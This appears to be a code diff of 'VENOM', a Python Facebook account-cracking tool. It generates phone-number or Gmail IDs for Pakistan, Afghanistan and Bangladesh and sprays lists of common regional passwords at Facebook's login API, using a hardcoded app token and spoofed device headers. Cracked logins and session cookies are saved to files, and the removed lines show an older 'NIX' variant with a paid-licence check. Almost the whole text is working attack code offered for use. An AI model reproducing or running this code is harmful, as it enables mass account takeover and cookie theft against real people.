+    clear();p('\033[1;32m [\033[1;37m1\033[1;32m] \033[1;37mMETHOD \033[1;32m>>> \033[1;33m• \033[1;37mNew & Old\033[1;33m•');line()
+    #line()
+    methd=input(" \033[1;32m[?] \033[1;37mChoose : ")
+    plist=[]
+    clear()
+ 
+    try:
+        ps_limit = int(input(("\033[1;32m [?]\033[1;37m Enter Password Limit : ")))
+    except:
+        ps_limit =1
+    clear()
+    print(f'\033[1;32m [✓] \033[1;37mYour Choosed Password Limits : \033[1;32m',ps_limit);line();print(f'\033[1;32m [•] \033[1;37mEXAMPLE : first last,firtslast,first123');line()
+    for i in range(ps_limit):
+        plist.append(input(f" \033[1;32m[?]\033[1;37m Put Password\033[1;32m [\033[1;37m%s\033[1;32m]\033[1;37m : "%(i+1)))
+    with tred(max_workers=30) as VENOM:
+        clear()
+        tl = str(len(fo))
+        
+        
+        print(f'\033[1;32m (√) \033[1;37mTotal IDs  :\033[1;32m ',tl)
+        #p('\033[1;32m [√] \033[1;37mMethod \033[1;32m>\033[1;37m M{mthd}')
+ 
+        print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+        #line()
+        for user in fo:
+            ids,names = user.split('|')
+            passlist = plist
+            if methd =='1':
+                VENOM.submit(api1,ids,names,passlist)
+            #elif methd =='2':
+                #VENOM.submit(api1,ids,names,passlist)
+               # line();print('\033[1;32m [!] \033[1;31mComing Soon...!');exit()
+            else:
+                VENOM.submit(api1,ids,names,passlist)
+ 
+                
+    line()
+    p("\033[1;32m [•]\033[1;37m Cloning Hasbeen Completed ")
+    p(" \033[1;32m[•] \033[1;37mCloning Accounts Saved in\033[1;32m /sdcard/VENOM")
 
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            #print(iid+'|'+pws+'|'+str(log_cookies))
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[151:166]
-                print('\033[1;32m[NIX-OK] '+cid+' | '+ps+'\033[0;97m')
-                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
-                linex()
-                open('NIX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:152]
-                print('\033[1;31m[NIX-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('NIX-CP.txt', 'a').write(uid+' | '+ps+'\n')
-                cps.append(cid)
-                break
+    line()
+ 
+    input("\033[1;32m [•]\033[1;33m Press Enter To Go Back ")
+    os.system('python VENOM.py')
+
+###########______###########
+
+def pak():
+                user=[]
+                clear()
+                print('\033[1;32m [+] \033[1;37mCODE : 0300,0301,0333...etc');line()
+                code = input('\033[1;32m [?]\033[1;37m INPUT CODE : ')
+                try:                    
+                        clear();print('\033[1;32m [+] \033[1;37m Example : 2000,5000,10000...');line();limit = int(input('\033[1;32m [?] \033[1;37mENTER LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+               # clear();c=input('\033[1;32m [?] \033[1;37mShow Cookie \033[1;32m(y/n) : \033[1;37m')
+               # if (c).lower() == "y":user_opt.append("c")
+   
+ 
+                #clear();cp=input('\033[1;32m [?] \033[1;33m Show Cp Account \033[1;32m(y/n) : \033[1;37m')
+                 
+                with tred(max_workers=30) as VENOM:     
+                        clear()
+                        tl = str(len(user))
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'khankhan123','57273200','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak123','ali123','ali12345','ali786','ali123456','jan jan','baloch','baloch123','khan1122','khan12','i love you','iloveyou','janjan']
+ 
+                                VENOM.submit(rd1,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+
+def afg():
+                user=[]
+                clear()
+                print('\033[1;32m [+] \033[1;37mCODE : 9377,9376,9378...etc');line()
+                code = input('\033[1;32m [?]\033[1;37m INPUT CODE : ')
+ 
+                try:                    
+                        clear();print('\033[1;32m [+] \033[1;37m Example : 2000,5000,10000...');line();limit = int(input('\033[1;32m [?] \033[1;37mENTER LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+               # clear();c=input('\033[1;32m [?] \033[1;37mShow Cookie \033[1;32m(y/n) : \033[1;37m')
+               # if (c).lower() == "y":user_opt.append("c")
+   
+                #clear();cp=input('\033[1;32m [?] \033[1;33m Show Cp Account \033[1;32m(y/n) : \033[1;37m')
+                 
+                with tred(max_workers=30) as VENOM:     
+                        clear()
+                        tl = str(len(user))
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        for psx in user:
+ 
+                                ids = code+psx
+                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                VENOM.submit(rd1,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+
+def bd():
+                user=[]
+ 
+                clear()
+                print('\033[1;32m [+] \033[1;37mCODE : 018,016,017...etc');line()
+                code = input('\033[1;32m [?]\033[1;37m INPUT CODE : ')
+                try:                    
+                        clear();print('\033[1;32m [+] \033[1;37m Example : 2000,5000,10000...');line();limit = int(input('\033[1;32m [?] \033[1;37mENTER LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+               # clear();c=input('\033[1;32m [?] \033[1;37mShow Cookie \033[1;32m(y/n) : \033[1;37m')
+               # if (c).lower() == "y":user_opt.append("c")
+   
+                #clear();cp=input('\033[1;32m [?] \033[1;33m Show Cp Account \033[1;32m(y/n) : \033[1;37m')
+                 
+                with tred(max_workers=30) as VENOM:     
+                        clear()
+                        tl = str(len(user))
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','janjan','free fire','freefire','57273200']
+                                VENOM.submit(rd1,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+
+ 
+
+def gmail():
+                os.system('rm -rf .gm.txt')
+                clear()
+                first = input('\033[1;32m [?] \033[1;37mEnter First Name : ')
+                line()
+                last = input('\033[1;32m [?] \033[1;37mEnter Last Name : ')
+                clear()
+                print(' \033[1;32m[•] \033[1;33mExample : \033[1;32m@gmail.com , @yahoo.com\033[1;37m...etc')
+                line()
+                domain = input(' \033[1;32m[?] \033[1;37mChoose Gmail : ')
+                line()
+                try:
+                        limit=int(input(' \033[1;32m[?]\033[1;37m Enter Limit : '))
+ 
+                except ValueError:
+                        limit = 5000
+                line()
+                print(' \033[1;32m[!] \033[1;33mPlz Wait Syr...!\n \033[1;32m[!] \033[1;37mGetting gmails...!')
+                lists = ['3','4']
+ 
+                for xd in range(limit):
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('.gm.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        else:
+ 
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('.gm.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        fo = open('.gm.txt', 'r').read().splitlines()
+                with tred(max_workers=30) as VENOM:
+                        total = str(len(fo))
+ 
+                        clear()
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+total);print('\033[1;32m (√) \033[1;37mChosed Gmail  : %s'%(domain));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        for user in fo:
+                                ids,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
+                                try:
+ 
+                                        last_name = names.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+ 
+                                VENOM.submit(rd1,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+
+
+def rd1(ids,passlist):
+    try:
+        global ok,loop,sim_id
+        sys.stdout.write('\r\r\33[1;37m [\33[1;32mVENOM-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        for pas in passlist:
+                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                fbbv = str(random.randint(000000000,999999999))
+                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                fbbv = str(random.randint(000000000,999999999))
+                fbrv = str(random.randint(000000000,999999999))
+                fbsv = str(random.randint(4,13))+'.0'
+                model,build = random.choice(samsung).split('|')
+                fbmf = 'samsung'
+                fbbd = 'samsung'
+                en = random.choice(['en_US','en_GB'])
+                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+                network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
+                xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/Hwawie;"+"FBBD/Opppo;"+"FBPN/com.facebook.katana;"+"FBDV/Samsong 17974;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:arfuck-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/relmeo;"+"FBBD/technO;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
+                #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
+                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.82,width=1605,height=633};FBLC/es_ES;FBRV/'+fbrv+';FBCR/459657077;FBMF/Huawei;FBBD/Apple;FBPN/com.facebook.katana;FBDV/Device-9601;FBSV/'+fbsv+';FBOP/19;FBCA/armeabi-v8a;]"
+                head = {'User-Agent':VENOM_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+                po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
+                if 'session_key' in po:
+                        uid = str(po['uid'])
+                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                        cookie = f"sb={ssbb};{ckkk}"
+                        print('\r\r\033[1;32m [VENOM-OK] '+uid+' √ '+pas)
+                        print(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
+                        file_path_ok = os.path.join(folder_path, 'VENOM-R-OK.txt')
+                        file_path_cookies = os.path.join(folder_path, 'VENOM-R-COOKIE.txt')
+                        with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
+                            file_ok.write(uid+' √ '+pas+'\n')
+                            file_cookies.write(uid+' √ '+pas+' >>> '+cookie+'\n')
+                        oks.append(uid)
+                        break
+                elif 'www.facebook.com' in po['error']['message']:
+                        uid = str(po['error']['error_data']['uid'])
+                        #print(f'\r\r\33[1m\33[1;35m [CP] '+uid+' | '+pas+'\033[1;97m')
+                        file_path = os.path.join(folder_path, 'VENOM-R-CP.txt')
+                        with open(file_path, 'a') as file:
+                            file.write(uid+' √ '+pas+'\n')
+                        cps.append(uid)
+                        break
+                else:
+                    continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+
+def api1(ids,names,passlist):
+    try:
+        global ok,loop,sim_id
+        sys.stdout.write('\r\r\33[1;37m [\33[1;32mVENOM-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+            fbbv = str(random.randint(000000000,999999999))
+            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+            fbbv = str(random.randint(000000000,999999999))
+            fbrv = str(random.randint(000000000,999999999))
+            fbsv = str(random.randint(4,13))+'.0'
+            model,build = random.choice(samsung).split('|')
+            fbmf = 'samsung'
+            fbbd = 'samsung'
+            en = random.choice(['en_US','en_GB'])
+            cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+            network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
+            xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.katana;"+"FBDV/vivo 1724;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
+            #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
+            head = {'User-Agent':VENOM_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+            if 'session_key' in po:
+                    uid = str(po['uid'])
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                    cookie = f"sb={ssbb};{ckkk}"
+                    print('\r\r\033[1;32m [VENOM-OK] '+uid+' √ '+pas)
+                    print(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
+                    file_path = os.path.join(folder_path, 'VENOM-FILE-OK.txt')
+                    #session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+                    open('/sdcard/VENOM/VENOM-FILE-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
+                    with open(file_path, 'a') as file:
+                        file.write(uid+' √ '+pas+'\n')
+                    oks.append(uid)
+                    break
+            elif 'www.facebook.com' in po['error']['message']:
+                    uid = str(po['error']['error_data']['uid'])
+                    #print(f'\r\r\33[1m\33[1;35m [MOOSA-CP] '+uid+' | '+pas+'\033[1;97m')
+                    file_path = os.path.join(folder_path, 'VENOM-FILE-CP.txt')
+                    with open(file_path, 'a') as file:
+                        file.write(uid+' √ '+pas+'\n')
+                    cps.append(uid)
+                    break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[1;92m[NIX]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
-        sys.stdout.flush()
-    except:
-        pass 
-############            
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
 
-##########
-   
-def main_apv():
-    os.system("clear")
-    print(logo)
-    uuid = str(os.geteuid())
-    Xyteee=('Nix1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
-    print(logo)
-    os.system("clear");print(logo)
-    print(f" Your Key : \x1b[1;31m"+Xyteee)
-    print("\x1b[1;92m--------------------------------------------------")
-    try:
-        system = requests.get("https://github.com/Mr-Nix8/Paid/blob/main/Approve.txt").text 
-        if Xyteee in system:
-            print()
-            msg = str(os.geteuid()) 
-            time.sleep(1) 
-            menu()
-            pass 
-        else: 
-            print('\033[1;92m Now it will work well in all countries')
-            print('\033[1;92m-----------------------------------------------------\033[1;97m')
-            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : Nix Tools Can buy in all countries!')
-            print('\033[1;92m-----------------------------------------------------\033[1;97m')
-            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 8$ \033[1;92mApproval For 1 month')
-            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 6$ \033[1;92mApproval For 15 days')
-            print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m 3$ \033[1;92mApproval For 7 days \033[1;37m')
-            print('\033[1;92m-----------------------------------------------------')
-            Picchi = input(' Select Buy Option : ')
-            os.system("clear")
-            print(logo)
-            print(f" \033[1;92mYour Key :\033[31;1m{Xyteee}")
-            print("\x1b[1;92m Tools    : FB Cloning");print(" \033[1;92m\n \033[1;92m\033[1;92mNote: If You Are Free User Don't Come IB\033[0;0m");print('\n\x1b[1;92m [•] File Crack \x1b[1;92m\n [•] Random Crack \n [•] Exit Program')
-            print("-----------------------------------------------------")
-            url_wa = "https://api.whatsapp.com/send?phone=+8801332718196&text="
-            choice = input(" Enter your choice  : ")
-            tks = ("Hi Nix Sir, I Need To Buy Your Nix Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
-            subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-            print('-----------------------------------------------------\n Run again with permission from admin')
-            main_apv()
-    except: 
-        sys.exit()
-
-with SiamNIX(max_workers=30) as rhu:
- #   rhu.submit(sexy)
-    rhu.submit(main_apv)
-
-
-
+try:Main_VENOM()
+except requests.exceptions.ConnectionError:
+    print('\n\033[1;92m [×] \033[1;91mNo internet connection ...')
+except Exception as e:pass
